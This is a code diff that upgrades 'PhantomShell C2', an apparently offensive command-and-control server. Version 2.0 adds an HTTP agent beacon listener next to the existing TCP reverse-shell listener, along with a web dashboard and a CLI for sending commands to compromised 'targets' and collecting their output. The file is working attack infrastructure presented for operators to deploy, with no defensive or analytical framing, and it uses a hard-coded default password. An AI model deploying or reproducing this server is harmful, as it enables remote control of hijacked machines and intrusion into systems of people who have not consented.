@@ -1,13 +1,16 @@
 #!/usr/bin/python3
 """
-PhantomShell C2 Server
-by by Adrilaw/Kidpentester (https://github.com/Adrilaw)  & The-Psypher (https://github.com/The-Psypher) - Developers at Red Parakeet.
+PhantomShell C2 Server — Professional Edition
+by Red Parakeet Security Team (https://github.com/Red-Parakeet)
 
-Run this on your VPS. Operators connect via the web UI or CLI.
-Targets connect back with PhantomShell payloads.
+Unified C2 platform supporting:
+- TCP reverse shells (original PhantomShell)
+- HTTP/HTTPS agent beacons (agent.py / agent.ps1)
+- Web UI for session management
+- CLI interface for operators
 
 Usage:
-    python3 c2_server.py --port 4444 --web-port 8080 --password yourpassword
+    python3 phantomc2.py --port 4444 --web-port 8080 --password yourpassword
 """
 
 import socket
@@ -22,11 +25,14 @@ import hashlib
 import datetime
 import queue
 import ssl
+import base64
+import urllib.parse
+import uuid
+import random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse, parse_qs
-import base64
 
-VERSION = "1.0"
+VERSION = "2.0"
 
 # ── Color ──────────────────────────────────────────────────────
 C = {
@@ -55,7 +61,8 @@ def banner():
    ██║     ██╔═══╝      ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ╚██████╗███████╗     ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
     ╚═════╝╚══════╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝{C['R']}
-  {C['d']}PhantomShell C2 v{VERSION} — by Red Parakeet Security Team{C['R']}
+  {C['d']}PhantomShell C2 v{VERSION} — Professional Edition — by Red Parakeet Security Team{C['R']}
+  {C['d']}TCP Reverse Shells + HTTP/HTTPS Agents — www.redparakeet,org{C['R']}
 """)
 
 
@@ -64,25 +71,46 @@ def banner():
 # ══════════════════════════════════════════════════════════════
 
 class Session:
-    def __init__(self, sid, sock, addr):
-        self.id        = sid
-        self.sock      = sock
-        self.addr      = addr[0]
-        self.port      = addr[1]
+    """Unified session object for TCP and HTTP agents."""
+    
+    # Session types
+    TYPE_TCP = "tcp"
+    TYPE_HTTP = "http"
+    
+    def __init__(self, sid, sock=None, addr=None, session_type=TYPE_TCP):
+        self.id = sid
+        self.sock = sock
+        self.addr = addr[0] if addr else "unknown"
+        self.port = addr[1] if addr else 0
+        self.type = session_type
         self.connected = datetime.datetime.now()
         self.last_seen = datetime.datetime.now()
-        self.hostname  = "unknown"
-        self.username  = "unknown"
-        self.os        = "unknown"
-        self.alive     = True
-        self.lock      = threading.Lock()
+        self.hostname = "unknown"
+        self.username = "unknown"
+        self.os = "unknown"
+        self.alive = True
+        self.lock = threading.Lock()
         self.cmd_queue = queue.Queue()
         self.out_queue = queue.Queue()
-
+        
+        # HTTP agent specific
+        self.agent_id = None
+        self.platform_info = None
+        self.pending_commands = {}  # command_id -> timestamp
+        self.command_results = {}   # command_id -> output
+        
     def send(self, cmd: str) -> str:
-        """Send a command and wait for output."""
+        """Send a command and wait for output (TCP) or queue (HTTP)."""
         if not self.alive:
             return "[session dead]"
+            
+        if self.type == self.TYPE_TCP:
+            return self._send_tcp(cmd)
+        else:
+            return self._send_http(cmd)
+    
+    def _send_tcp(self, cmd: str) -> str:
+        """TCP reverse shell command execution."""
         try:
             with self.lock:
                 self.sock.settimeout(30)
@@ -94,7 +122,6 @@ class Session:
                         if not chunk:
                             break
                         output += chunk
-                        # Stop reading when prompt appears
                         if output.endswith(b"> ") or b"PS>" in output[-20:]:
                             break
                     except socket.timeout:
@@ -103,37 +130,80 @@ class Session:
         except Exception as e:
             self.alive = False
             return f"[error: {e}]"
+    
+    def _send_http(self, cmd: str) -> str:
+        """HTTP agent command queueing."""
+        cmd_id = str(uuid.uuid4())[:8]
+        self.pending_commands[cmd_id] = time.time()
+        self.cmd_queue.put((cmd_id, cmd))
+        self.last_seen = datetime.datetime.now()
+        return f"[queued] Command sent (ID: {cmd_id})"
+
+    def set_http_result(self, cmd_id: str, output: str):
+        """Store HTTP agent command result."""
+        self.command_results[cmd_id] = output
+        if cmd_id in self.pending_commands:
+            del self.pending_commands[cmd_id]
+
+    def get_http_command(self) -> tuple:
+        """Get next queued command for HTTP agent."""
+        try:
+            return self.cmd_queue.get_nowait()
+        except queue.Empty:
+            return None
 
     def info_dict(self):
         return {
-            "id":        self.id,
-            "ip":        self.addr,
-            "port":      self.port,
-            "hostname":  self.hostname,
-            "username":  self.username,
-            "os":        self.os,
+            "id": self.id,
+            "ip": self.addr,
+            "port": self.port,
+            "type": self.type,
+            "hostname": self.hostname,
+            "username": self.username,
+            "os": self.os,
             "connected": self.connected.strftime("%Y-%m-%d %H:%M:%S"),
             "last_seen": self.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
-            "alive":     self.alive,
+            "alive": self.alive,
+            "agent_id": self.agent_id,
         }
 
 
 class SessionManager:
     def __init__(self):
         self._sessions = {}
-        self._lock     = threading.Lock()
-        self._next_id  = 1
+        self._lock = threading.Lock()
+        self._next_id = 1
 
-    def add(self, sock, addr) -> Session:
+    def add(self, sock, addr, session_type=Session.TYPE_TCP) -> Session:
         with self._lock:
             sid = self._next_id
             self._next_id += 1
-            s = Session(sid, sock, addr)
+            s = Session(sid, sock, addr, session_type)
+            self._sessions[sid] = s
+            return s
+
+    def add_http(self, agent_id: str, platform_info: str, addr: str) -> Session:
+        """Add HTTP agent session."""
+        with self._lock:
+            sid = self._next_id
+            self._next_id += 1
+            s = Session(sid, None, (addr, 0), Session.TYPE_HTTP)
+            s.agent_id = agent_id
+            s.platform_info = platform_info
+            s.hostname = platform_info.split('|')[1].strip() if '|' in platform_info else "unknown"
+            s.username = platform_info.split('|')[2].strip() if '|' in platform_info else "unknown"
+            s.os = platform_info.split('|')[0].strip() if '|' in platform_info else "unknown"
             self._sessions[sid] = s
             return s
 
     def get(self, sid: int) -> Session:
         return self._sessions.get(sid)
+
+    def get_by_agent_id(self, agent_id: str) -> Session:
+        for s in self._sessions.values():
+            if s.agent_id == agent_id:
+                return s
+        return None
 
     def all(self) -> list:
         return list(self._sessions.values())
@@ -146,7 +216,6 @@ class SessionManager:
             self._sessions.pop(sid, None)
 
     def prune(self):
-        """Remove dead sessions."""
         with self._lock:
             dead = [sid for sid, s in self._sessions.items() if not s.alive]
             for sid in dead:
@@ -155,29 +224,28 @@ class SessionManager:
 
 # Global session manager
 SM = SessionManager()
-LOG = []  # event log
+LOG = []
 
 
 def log(msg: str, level: str = "info"):
-    ts    = datetime.datetime.now().strftime("%H:%M:%S")
+    ts = datetime.datetime.now().strftime("%H:%M:%S")
     entry = {"ts": ts, "level": level, "msg": msg}
     LOG.append(entry)
     if len(LOG) > 500:
         LOG.pop(0)
     icons = {"info": INFO, "ok": OK, "err": ERR, "star": STAR}
-    icon  = icons.get(level, INFO)
+    icon = icons.get(level, INFO)
     print(f"{icon} [{ts}] {msg}")
 
 
 # ══════════════════════════════════════════════════════════════
-# REVERSE SHELL LISTENER
+# TCP REVERSE SHELL LISTENER
 # ══════════════════════════════════════════════════════════════
 
-def handle_session(sess: Session):
-    """Gather info from new session and keep it alive."""
-    log(f"New session #{sess.id} from {sess.addr}:{sess.port}", "ok")
+def handle_tcp_session(sess: Session):
+    """Gather info from new TCP session and keep it alive."""
+    log(f"New TCP session #{sess.id} from {sess.addr}:{sess.port}", "ok")
 
-    # Try to gather basic info
     try:
         hostname = sess.send("hostname")
         if hostname and len(hostname) < 100:
@@ -193,13 +261,11 @@ def handle_session(sess: Session):
     except:
         pass
 
-    log(f"Session #{sess.id} — {sess.username}@{sess.hostname} ({sess.os})", "star")
+    log(f"TCP Session #{sess.id} — {sess.username}@{sess.hostname} ({sess.os})", "star")
 
-    # Keep-alive loop
     while sess.alive:
         time.sleep(10)
         try:
-            # Send empty to check if alive
             sess.sock.settimeout(5)
             sess.sock.sendall(b"echo alive\n")
             data = sess.sock.recv(256)
@@ -208,38 +274,137 @@ def handle_session(sess: Session):
             sess.last_seen = datetime.datetime.now()
         except:
             sess.alive = False
-            log(f"Session #{sess.id} died ({sess.addr})", "err")
+            log(f"TCP Session #{sess.id} died ({sess.addr})", "err")
             break
 
 
-def shell_listener(host: str, port: int):
+def tcp_listener(host: str, port: int):
     """Main TCP listener for incoming reverse shells."""
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         srv.bind((host, port))
         srv.listen(50)
-        log(f"Shell listener on {host}:{port}", "ok")
+        log(f"TCP listener on {host}:{port}", "ok")
     except Exception as e:
-        log(f"Cannot bind shell listener on port {port}: {e}", "err")
+        log(f"Cannot bind TCP listener on port {port}: {e}", "err")
         sys.exit(1)
 
     while True:
         try:
             conn, addr = srv.accept()
-            sess = SM.add(conn, addr)
-            t = threading.Thread(target=handle_session, args=(sess,), daemon=True)
+            sess = SM.add(conn, addr, Session.TYPE_TCP)
+            t = threading.Thread(target=handle_tcp_session, args=(sess,), daemon=True)
             t.start()
         except Exception as e:
             log(f"Accept error: {e}", "err")
 
 
 # ══════════════════════════════════════════════════════════════
+# HTTP AGENT HANDLER
+# ══════════════════════════════════════════════════════════════
+
+class HTTPAgentHandler(BaseHTTPRequestHandler):
+    """HTTP handler for agent beaconing and command delivery."""
+    
+    def log_message(self, *_):
+        pass
+    
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        path = parsed.path
+        query = parse_qs(parsed.query)
+        
+        # ── Beacon endpoint ──────────────────────────────────────────────────
+        if path == "/beacon":
+            agent_id = query.get("id", [None])[0]
+            platform = query.get("platform", ["unknown"])[0]
+            
+            if not agent_id:
+                self.send_response(400)
+                self.end_headers()
+                self.wfile.write(b"missing id")
+                return
+            
+            # Get or create session
+            sess = SM.get_by_agent_id(agent_id)
+            if not sess:
+                sess = SM.add_http(agent_id, platform, self.client_address[0])
+                log(f"New HTTP agent #{sess.id} — {platform}", "ok")
+                log(f"HTTP Agent #{sess.id} — {sess.username}@{sess.hostname} ({sess.os})", "star")
+            else:
+                sess.last_seen = datetime.datetime.now()
+            
+            # Check for queued command
+            cmd = sess.get_http_command()
+            
+            if cmd:
+                cmd_id, command = cmd
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.end_headers()
+                self.wfile.write(command.encode("utf-8"))
+                log(f"HTTP Agent #{sess.id} CMD: {command[:50]}{'...' if len(command) > 50 else ''}", "star")
+            else:
+                self.send_response(204)  # No Content
+                self.end_headers()
+                
+            return
+        
+        # ── Result endpoint ──────────────────────────────────────────────────
+        if path == "/result":
+            agent_id = query.get("id", [None])[0]
+            
+            if not agent_id:
+                self.send_response(400)
+                self.end_headers()
+                self.wfile.write(b"missing id")
+                return
+            
+            # Read body
+            content_length = int(self.headers.get("Content-Length", 0))
+            body = self.rfile.read(content_length).decode("utf-8", errors="replace")
+            
+            sess = SM.get_by_agent_id(agent_id)
+            if sess:
+                # We don't have a cmd_id for tracking, but we can store the result
+                # For simplicity, we'll just log it
+                log(f"HTTP Agent #{sess.id} result: {len(body)} bytes", "info")
+                sess.last_seen = datetime.datetime.now()
+                # Store last result
+                sess.command_results["_last"] = body
+            
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"OK")
+            return
+        
+        # ── 404 ──────────────────────────────────────────────────────────────
+        self.send_response(404)
+        self.end_headers()
+        self.wfile.write(b"Not Found")
+    
+    def do_POST(self):
+        """Handle POST requests (same as GET for result)."""
+        self.do_GET()
+
+
+def http_agent_listener(host: str, port: int):
+    """HTTP server for agent beaconing."""
+    try:
+        server = HTTPServer((host, port), HTTPAgentHandler)
+        log(f"HTTP agent listener on http://{host}:{port}", "ok")
+        server.serve_forever()
+    except Exception as e:
+        log(f"HTTP agent listener error: {e}", "err")
+
+
+# ══════════════════════════════════════════════════════════════
 # WEB UI + API
 # ══════════════════════════════════════════════════════════════
 
-WEB_PASSWORD = "phantomshell"   # overridden by --password flag
-TOKENS       = set()            # active session tokens
+WEB_PASSWORD = "phantomshell"
+TOKENS = set()
 
 
 def make_token(password: str) -> str:
@@ -252,7 +417,6 @@ def check_auth(handler) -> bool:
         k, _, v = part.strip().partition("=")
         if k.strip() == "ps_token" and v.strip() in TOKENS:
             return True
-    # Also check Authorization header for API calls
     auth = handler.headers.get("Authorization", "")
     if auth.startswith("Bearer ") and auth[7:] in TOKENS:
         return True
@@ -290,7 +454,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
     overflow-x: hidden;
   }
 
-  /* Scanline overlay */
   body::before {
     content: '';
     position: fixed; inset: 0;
@@ -351,7 +514,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
     height: calc(100vh - 57px);
   }
 
-  /* Sessions panel */
   .sessions-panel {
     border-right: 1px solid var(--border);
     background: var(--surface);
@@ -415,6 +577,15 @@ HTML_PAGE = r"""<!DOCTYPE html>
     margin-bottom: 4px;
   }
 
+  .session-type {
+    font-size: 9px;
+    padding: 1px 6px;
+    border-radius: 10px;
+    background: rgba(0,212,255,0.15);
+    color: var(--accent2);
+    margin-left: 6px;
+  }
+
   .session-host {
     font-size: 12px;
     color: var(--text);
@@ -438,17 +609,15 @@ HTML_PAGE = r"""<!DOCTYPE html>
   .alive-dot.on  { background: var(--green);  box-shadow: 0 0 4px var(--green); }
   .alive-dot.off { background: var(--accent); }
 
-  /* Main area */
   .main-area {
     display: flex;
     flex-direction: column;
     overflow: hidden;
   }
 
-  /* Stats row */
   .stats-row {
     display: grid;
-    grid-template-columns: repeat(4, 1fr);
+    grid-template-columns: repeat(5, 1fr);
     border-bottom: 1px solid var(--border);
   }
 
@@ -479,7 +648,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
   .stat-value.green  { color: var(--green);  text-shadow: 0 0 15px rgba(0,255,136,0.4); }
   .stat-value.yellow { color: var(--yellow); text-shadow: 0 0 15px rgba(255,214,10,0.4); }
 
-  /* Terminal */
   .terminal-area {
     flex: 1;
     display: flex;
@@ -498,6 +666,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     border-radius: 4px;
     display: flex;
     gap: 24px;
+    flex-wrap: wrap;
   }
 
   .session-info-bar span { color: var(--text); }
@@ -522,6 +691,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
   .output-box .out      { color: var(--green); }
   .output-box .err-out  { color: var(--accent); }
   .output-box .sys      { color: var(--dim); font-style: italic; }
+  .output-box .queued   { color: var(--yellow); font-style: italic; }
 
   .input-row {
     display: flex;
@@ -570,7 +740,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
   .send-btn:hover { background: #ff4757; box-shadow: 0 0 15px rgba(230,57,70,0.4); }
 
-  /* Quick commands */
   .quick-cmds {
     display: flex;
     gap: 6px;
@@ -591,7 +760,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
   .qcmd:hover { border-color: var(--accent2); color: var(--accent2); }
 
-  /* Log panel */
   .log-panel {
     border-top: 1px solid var(--border);
     max-height: 140px;
@@ -616,7 +784,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
   .log-entry.err .log-msg { color: var(--accent); }
   .log-entry.star .log-msg { color: var(--accent2); }
 
-  /* No session placeholder */
   .no-session {
     flex: 1;
     display: flex;
@@ -634,7 +801,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
   .no-session p { font-size: 12px; letter-spacing: 1px; }
 
-  /* Login overlay */
   #login-overlay {
     position: fixed; inset: 0;
     background: rgba(8,11,15,0.97);
@@ -735,7 +901,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
 </header>
 
 <div class="layout">
-  <!-- Sessions panel -->
   <div class="sessions-panel">
     <div class="panel-header">
       ACTIVE SESSIONS
@@ -745,14 +910,12 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div style="color:var(--dim);font-size:11px;text-align:center;padding:32px 16px;line-height:2">
         Waiting for connections...<br>
         <span style="color:#1a2332">─────────────────</span><br>
-        Run a PhantomShell payload<br>on the target machine
+        Deploy a PhantomShell payload<br>or HTTP agent on the target
       </div>
     </div>
   </div>
 
-  <!-- Main area -->
   <div class="main-area">
-    <!-- Stats -->
     <div class="stats-row">
       <div class="stat-box">
         <div class="stat-label">Total Sessions</div>
@@ -767,12 +930,15 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="stat-value red" id="stat-dead">0</div>
       </div>
       <div class="stat-box">
-        <div class="stat-label">Commands Sent</div>
-        <div class="stat-value yellow" id="stat-cmds">0</div>
+        <div class="stat-label">TCP</div>
+        <div class="stat-value yellow" id="stat-tcp">0</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-label">HTTP</div>
+        <div class="stat-value yellow" id="stat-http">0</div>
       </div>
     </div>
 
-    <!-- Terminal -->
     <div class="terminal-area" id="terminal-area">
       <div class="no-session">
         <div class="no-session-icon">👻</div>
@@ -780,7 +946,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
     </div>
 
-    <!-- Log -->
     <div class="log-panel" id="log-panel">
       <div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-msg">PhantomShell C2 ready</span></div>
     </div>
@@ -793,8 +958,8 @@ let activeSid = null;
 let cmdCount = 0;
 let cmdHistory = [];
 let histIdx = -1;
+let pollInterval = null;
 
-// ── Auth ────────────────────────────────────────────────────
 async function doLogin() {
   const pw  = document.getElementById('pw-input').value;
   const res = await fetch('/api/login', {
@@ -814,7 +979,6 @@ async function doLogin() {
   }
 }
 
-// Try stored token on load
 window.addEventListener('load', async () => {
   if (token) {
     const res = await fetch('/api/sessions', {
@@ -833,7 +997,6 @@ window.addEventListener('load', async () => {
   });
 });
 
-// ── API helpers ─────────────────────────────────────────────
 async function api(path, method='GET', body=null) {
   const opts = {
     method,
@@ -848,17 +1011,16 @@ async function api(path, method='GET', body=null) {
   return res.json();
 }
 
-// ── Clock ───────────────────────────────────────────────────
 setInterval(() => {
   document.getElementById('hdr-time').textContent =
     new Date().toTimeString().slice(0,8);
 }, 1000);
 
-// ── Polling ─────────────────────────────────────────────────
 function startPolling() {
   refreshSessions();
   refreshLogs();
-  setInterval(refreshSessions, 3000);
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(refreshSessions, 3000);
   setInterval(refreshLogs, 5000);
 }
 
@@ -869,20 +1031,23 @@ async function refreshSessions() {
   const sessions = data.sessions;
   const alive    = sessions.filter(s => s.alive).length;
   const dead     = sessions.length - alive;
+  const tcpCount = sessions.filter(s => s.type === 'tcp').length;
+  const httpCount = sessions.filter(s => s.type === 'http').length;
 
   document.getElementById('sess-count').textContent  = alive;
   document.getElementById('hdr-sessions').textContent = `${alive} SESSION${alive !== 1 ? 'S' : ''}`;
   document.getElementById('stat-total').textContent  = sessions.length;
   document.getElementById('stat-alive').textContent  = alive;
   document.getElementById('stat-dead').textContent   = dead;
-  document.getElementById('stat-cmds').textContent   = cmdCount;
+  document.getElementById('stat-tcp').textContent    = tcpCount;
+  document.getElementById('stat-http').textContent   = httpCount;
 
   const list = document.getElementById('sessions-list');
   if (sessions.length === 0) {
     list.innerHTML = `<div style="color:var(--dim);font-size:11px;text-align:center;padding:32px 16px;line-height:2">
       Waiting for connections...<br>
       <span style="color:#1a2332">─────────────────</span><br>
-      Run a PhantomShell payload<br>on the target machine
+      Deploy a PhantomShell payload<br>or HTTP agent on the target
     </div>`;
     return;
   }
@@ -893,6 +1058,7 @@ async function refreshSessions() {
       <div class="session-id">
         <span class="alive-dot ${s.alive ? 'on' : 'off'}"></span>
         SESSION #${s.id}
+        <span class="session-type">${s.type.toUpperCase()}</span>
       </div>
       <div class="session-host">${s.username}@${s.hostname}</div>
       <div class="session-meta">${s.ip} · ${s.connected}</div>
@@ -912,7 +1078,6 @@ async function refreshLogs() {
   `).join('');
 }
 
-// ── Session interaction ─────────────────────────────────────
 function selectSession(sid) {
   activeSid = sid;
   refreshSessions();
@@ -926,12 +1091,14 @@ async function renderTerminal(sid) {
   if (!sess) return;
 
   const ta = document.getElementById('terminal-area');
+  const isTcp = sess.type === 'tcp';
   ta.innerHTML = `
     <div class="session-info-bar">
+      <div>TYPE <span style="color:${isTcp ? 'var(--accent2)' : 'var(--yellow)'}">${sess.type.toUpperCase()}</span></div>
       <div>HOST <span>${sess.hostname}</span></div>
       <div>USER <span>${sess.username}</span></div>
       <div>IP <span>${sess.ip}</span></div>
-      <div>OS <span>${sess.os || 'Windows'}</span></div>
+      <div>OS <span>${sess.os || 'unknown'}</span></div>
       <div>STATUS <span style="color:${sess.alive ? 'var(--green)' : 'var(--accent)'}">${sess.alive ? 'ALIVE' : 'DEAD'}</span></div>
     </div>
     <div class="quick-cmds">
@@ -950,9 +1117,9 @@ async function renderTerminal(sid) {
       <span class="sys">// Session #${sid} — ${sess.username}@${sess.hostname} — ${sess.connected}</span>\n
     </div>
     <div class="input-row">
-      <span class="prompt">PS&gt;</span>
+      <span class="prompt">${isTcp ? 'PS' : 'HTTP'}&gt;</span>
       <input type="text" class="cmd-input" id="cmd-input"
-             placeholder="Enter PowerShell command..."
+             placeholder="${isTcp ? 'Enter PowerShell command...' : 'Enter command (HTTP polling)...'}"
              ${!sess.alive ? 'disabled' : ''}
              onkeydown="handleKey(event)" />
       <button class="send-btn" onclick="sendCmd()" ${!sess.alive ? 'disabled' : ''}>EXEC</button>
@@ -998,7 +1165,6 @@ async function sendCmd() {
   histIdx = -1;
   input.value = '';
   cmdCount++;
-  document.getElementById('stat-cmds').textContent = cmdCount;
 
   const out = document.getElementById('output-box');
   out.innerHTML += `<span class="cmd-echo">PS&gt; ${escHtml(cmd)}</span>\n`;
@@ -1007,12 +1173,15 @@ async function sendCmd() {
 
   const data = await api('/api/exec', 'POST', {session_id: activeSid, command: cmd});
 
-  // Remove the "executing..." line
   out.innerHTML = out.innerHTML.replace('<span class="sys">// executing...</span>\n', '');
 
   if (data && data.output !== undefined) {
-    const cls = data.output.includes('error') || data.output.includes('Error') ? 'err-out' : 'out';
-    out.innerHTML += `<span class="${cls}">${escHtml(data.output)}</span>\n\n`;
+    if (data.output.startsWith('[queued]')) {
+      out.innerHTML += `<span class="queued">${escHtml(data.output)}</span>\n\n`;
+    } else {
+      const cls = data.output.includes('error') || data.output.includes('Error') ? 'err-out' : 'out';
+      out.innerHTML += `<span class="${cls}">${escHtml(data.output)}</span>\n\n`;
+    }
   } else {
     out.innerHTML += `<span class="err-out">// no response or session dead</span>\n\n`;
   }
@@ -1077,9 +1246,9 @@ class C2Handler(BaseHTTPRequestHandler):
         self.send_json({"error": "not found"}, 404)
 
     def do_POST(self):
-        path    = urlparse(self.path).path
-        length  = int(self.headers.get("Content-Length", 0))
-        body    = json.loads(self.rfile.read(length) or b"{}") if length else {}
+        path = urlparse(self.path).path
+        length = int(self.headers.get("Content-Length", 0))
+        body = json.loads(self.rfile.read(length) or b"{}") if length else {}
 
         if path == "/api/login":
             pw = body.get("password", "")
@@ -1096,8 +1265,8 @@ class C2Handler(BaseHTTPRequestHandler):
             self.send_json({"error": "unauthorized"}, 401); return
 
         if path == "/api/exec":
-            sid  = body.get("session_id")
-            cmd  = body.get("command", "")
+            sid = body.get("session_id")
+            cmd = body.get("command", "")
             sess = SM.get(sid)
             if not sess:
                 self.send_json({"error": "session not found"}); return
@@ -1119,13 +1288,12 @@ def web_server(host: str, port: int):
 
 
 # ══════════════════════════════════════════════════════════════
-# CLI (for direct terminal interaction alongside web UI)
+# CLI
 # ══════════════════════════════════════════════════════════════
 
 def cli_loop():
-    """Optional interactive CLI for direct session control."""
-    time.sleep(1)  # Let servers start
-    print(f"\n{INFO} Type {C['c']}help{C['R']} for commands. Web UI is the primary interface.\n")
+    time.sleep(1)
+    print(f"\n{INFO} Type {C['c']}help{C['R']} for commands.\n")
 
     while True:
         try:
@@ -1137,12 +1305,12 @@ def cli_loop():
             continue
 
         parts = line.split(None, 2)
-        cmd   = parts[0].lower()
+        cmd = parts[0].lower()
 
         if cmd in ("help", "?"):
             print(f"""
   {C['c']}sessions{C['R']}              — list all sessions
-  {C['c']}interact <id>{C['R']}         — drop into interactive shell
+  {C['c']}interact <id>{C['R']}         — interact with a session
   {C['c']}exec <id> <cmd>{C['R']}       — run single command
   {C['c']}kill <id>{C['R']}             — mark session dead
   {C['c']}prune{C['R']}                 — remove dead sessions
@@ -1155,16 +1323,17 @@ def cli_loop():
             if not sessions:
                 print(f"  {C['d']}no sessions{C['R']}")
                 continue
-            print(f"\n  {'ID':<5} {'IP':<18} {'USER@HOST':<32} {'STATUS':<8} CONNECTED")
-            print(f"  {'─'*5} {'─'*18} {'─'*32} {'─'*8} {'─'*20}")
+            print(f"\n  {'ID':<5} {'TYPE':<6} {'IP':<18} {'USER@HOST':<32} {'STATUS':<8} CONNECTED")
+            print(f"  {'─'*5} {'─'*6} {'─'*18} {'─'*32} {'─'*8} {'─'*20}")
             for s in sessions:
                 status = f"{C['g']}ALIVE{C['R']}" if s.alive else f"{C['r']}DEAD{C['R']}"
-                print(f"  {s.id:<5} {s.addr:<18} {s.username+'@'+s.hostname:<32} {status:<20} {s.connected.strftime('%H:%M:%S')}")
+                stype = f"{C['c']}{s.type}{C['R']}" if s.type == 'tcp' else f"{C['y']}{s.type}{C['R']}"
+                print(f"  {s.id:<5} {stype:<6} {s.addr:<18} {s.username+'@'+s.hostname:<32} {status:<20} {s.connected.strftime('%H:%M:%S')}")
             print()
 
         elif cmd == "interact" and len(parts) >= 2:
             try:
-                sid  = int(parts[1])
+                sid = int(parts[1])
                 sess = SM.get(sid)
                 if not sess:
                     print(f"  {ERR} session {sid} not found")
@@ -1172,11 +1341,13 @@ def cli_loop():
                 if not sess.alive:
                     print(f"  {ERR} session {sid} is dead")
                     continue
-                print(f"\n  {OK} Interacting with #{sid} ({sess.username}@{sess.hostname})")
+                is_tcp = sess.type == 'tcp'
+                print(f"\n  {OK} Interacting with #{sid} ({sess.username}@{sess.hostname}) [{sess.type.upper()}]")
                 print(f"  {C['d']}Type 'back' to return to C2{C['R']}\n")
                 while sess.alive:
                     try:
-                        icmd = input(f"  {C['c']}PS #{sid}{C['R']} > ").strip()
+                        prompt = f"  {C['c']}{'PS' if is_tcp else 'HTTP'} #{sid}{C['R']} > "
+                        icmd = input(prompt).strip()
                     except (EOFError, KeyboardInterrupt):
                         break
                     if icmd.lower() == "back":
@@ -1189,7 +1360,7 @@ def cli_loop():
 
         elif cmd == "exec" and len(parts) >= 3:
             try:
-                sid  = int(parts[1])
+                sid = int(parts[1])
                 icmd = parts[2]
                 sess = SM.get(sid)
                 if not sess:
@@ -1201,7 +1372,7 @@ def cli_loop():
 
         elif cmd == "kill" and len(parts) >= 2:
             try:
-                sid  = int(parts[1])
+                sid = int(parts[1])
                 sess = SM.get(sid)
                 if sess:
                     sess.alive = False
@@ -1228,14 +1399,15 @@ def cli_loop():
 def get_args():
     p = argparse.ArgumentParser(
         prog=f"python3 {sys.argv[0]}",
-        description="PhantomShell C2 Server",
+        description="PhantomShell C2 Server — Professional Edition",
         formatter_class=argparse.RawTextHelpFormatter
     )
-    p.add_argument("--host",      default="0.0.0.0",       help="Bind address (default: 0.0.0.0)")
-    p.add_argument("--port",      type=int, default=4444,  help="Shell listener port (default: 4444)")
-    p.add_argument("--web-port",  type=int, default=8080,  help="Web UI port (default: 8080)")
-    p.add_argument("--password",  default="phantomshell",  help="Web UI password (default: phantomshell)")
-    p.add_argument("--no-cli",    action="store_true",     help="Disable interactive CLI")
+    p.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
+    p.add_argument("--port", type=int, default=4444, help="TCP shell listener port (default: 4444)")
+    p.add_argument("--http-port", type=int, default=8081, help="HTTP agent listener port (default: 8081)")
+    p.add_argument("--web-port", type=int, default=8080, help="Web UI port (default: 8080)")
+    p.add_argument("--password", default="phantomshell", help="Web UI password (default: phantomshell)")
+    p.add_argument("--no-cli", action="store_true", help="Disable interactive CLI")
     p.add_argument("--no-banner", action="store_true")
     return p.parse_args()
 
@@ -1252,20 +1424,24 @@ def main():
         banner()
 
     log(f"PhantomShell C2 v{VERSION} starting...", "star")
-    log(f"Shell listener : {args.host}:{args.port}", "info")
+    log(f"TCP listener   : {args.host}:{args.port}", "info")
+    log(f"HTTP agent     : http://{args.host}:{args.http_port}", "info")
     log(f"Web UI         : http://{args.host}:{args.web_port}", "info")
     log(f"Password       : {args.password}", "info")
     print()
 
-    # Start shell listener thread
-    t1 = threading.Thread(target=shell_listener, args=(args.host, args.port), daemon=True)
+    # Start TCP listener
+    t1 = threading.Thread(target=tcp_listener, args=(args.host, args.port), daemon=True)
     t1.start()
 
-    # Start web server thread
-    t2 = threading.Thread(target=web_server, args=(args.host, args.web_port), daemon=True)
+    # Start HTTP agent listener
+    t2 = threading.Thread(target=http_agent_listener, args=(args.host, args.http_port), daemon=True)
     t2.start()
 
-    # CLI runs in main thread (or skip with --no-cli)
+    # Start web server
+    t3 = threading.Thread(target=web_server, args=(args.host, args.web_port), daemon=True)
+    t3.start()
+
     if not args.no_cli:
         cli_loop()
     else:
